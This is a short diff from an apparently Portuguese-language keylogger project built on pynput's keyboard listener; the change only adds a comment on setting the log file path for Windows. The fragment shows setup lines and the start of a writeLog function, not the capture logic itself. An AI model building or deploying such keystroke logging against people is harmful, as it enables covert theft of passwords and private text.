@@ -2,6 +2,7 @@
 from pynput.keyboard import Listener
 
 #definir a localização do arquivo de log
+# Para Windows digite C:/Users/seuuser/seucaminho
 logFile = "/home/usuario/Área de Trabalho/Projetos/keylogger/log.txt"
 
 def writeLog(key):
